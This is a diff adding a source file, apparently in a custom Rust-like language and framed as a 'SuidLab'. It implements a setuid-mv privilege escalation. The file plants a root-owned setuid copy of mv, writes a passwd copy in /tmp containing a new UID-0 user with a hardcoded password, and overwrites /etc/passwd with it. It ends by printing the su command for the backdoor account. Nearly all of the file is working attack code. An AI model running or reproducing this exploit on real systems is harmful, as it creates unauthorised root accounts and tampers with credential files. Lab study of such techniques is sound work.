@@ -1,0 +1,137 @@
+
+
+use std::result::Result
+use std::string::String
+use std::process::cmd
+
+foreign "C"{
+    fn puts(const char *message)->i32
+}
+
+
+struct SuidLab{
+    /// where the planted suid mv lives
+    String binaryPath
+    /// The new user our exploit creates e.g thetechleadke
+    String newUser
+    /// The password for the new user
+    String password
+}
+
+
+impl SuidLab{
+    fn init(String binaryPath,String newUser,String password)->bool{
+        self->binaryPath = binaryPath
+        self->newUser    = newUser
+        self->password   = password
+
+        return true
+    }
+
+
+    #[static(true)]
+    fn new_unsafe(String binaryPath,String newUser,String password)->SuidLab{
+        SuidLab node
+        node.init(binaryPath,newUser,password)
+
+        return node
+    }
+
+    /// The first stage is planting the root-owned mv carrying the suid bit
+    /// This might require root privileges because chown/chmod only succeed when this program itself 
+    /// runs as root.
+    fn plant_vulnerable_binary()->Result<bool,str>{
+        Result<bool,str> copied = cmd("/usr/bin/cp",".",2,"/usr/bin/mv",self->binaryPath.cstring())
+
+        match copied{
+            Result::<bool,str>::Err(err) => {
+                return Result::<bool,str>::Err(err)
+            }
+            Result::<bool,str>::Ok(ok) => {
+            
+            }
+        }
+
+        Result<bool,str> owned = cmd("/usr/bin/chown",".",2,"root:root",self->binaryPath.cstring())
+
+        match owned{
+            Result::<bool,str>::Err(err) => {
+                return Result::<bool,str>::Err(err)
+            }
+            Result::<bool,str>::Ok(ok) => {
+            
+            }
+        }
+
+        return cmd("/usr/bin/chmod",".",2,"4755",self->binaryPath.cstring())
+    }
+
+    /// The second stage is unprivileged, and assumes you have the vulnerable mv in place
+    /// We build a passwd copy with UID of 0 "thetechleadke" in /tmp.
+    /// Everything in /tmp is normally writable by a normal user with no root privileges
+    fn stage_payload()->Result<bool,str>{
+        String script = String::new("H=$(openssl passwd -6 '")
+
+        script.push_back(self->password.cstring())
+        script.push_back("'); cp /etc/passwd /tmp/passwd.new; printf '")
+        script.push_back(self->newUser.cstring())
+        script.push_back(":%s:0:0:")
+        script.push_back(self->newUser.cstring())
+        script.push_back(":/root:/bin/bash\n' \"$H\" >> /tmp/passwd.new")
+
+        return cmd("/usr/bin/sh",".",2,"-c",script.cstring())
+    }
+
+    /// This is the second part of the second stage of our exploit
+    /// It is also unprivileged
+    /// We use the vulnerable mv to do the privileged write for us
+    /// This single rename is where the root's effective UID is borrowed
+    fn exploit()->Result<bool,str>{
+        return cmd(self->binaryPath.cstring(),".",2,"/tmp/passwd.new","/etc/passwd")
+    }
+}
+
+
+fn report(str successString,str errorString,Result<bool,str> result)->bool{
+    match result{
+        Result::<bool,str>::Ok(ok) => {
+            puts(successString)
+            return true
+        }
+        Result::<bool,str>::Err(err) => {
+            puts(errorString)
+            puts(err)
+            return false
+        }
+    }
+}
+
+
+#[no_mangle]
+fn main(i32 argc,char **argv)->i32{
+    String plant = String::new("plant") 
+    SuidLab lab  = SuidLab::new_unsafe(String::new("./mv"),String::new("thetechleadke"),String::new("linuxsucks123"))
+
+    if (argc > 2) and (plant.equals(argv[1])){
+        /// run once wth root privilege
+        if !report("planting vulnerable suid mv success","plant failed",lab.plant_vulnerable_binary()){
+            return 1
+        }
+    }
+
+    /// This is the meat of the exploit,run as a normal user
+    if !report("staging the exploit successs","stage failed",lab.stage_payload()){
+        return 1
+    }
+
+    if !report("exploit success","exploit failed",lab.exploit()){
+        return 1
+    }
+
+    puts("done - now run:  su thetechleadke   (password: linuxsucks123)")
+
+    return 0
+}
+
+
+
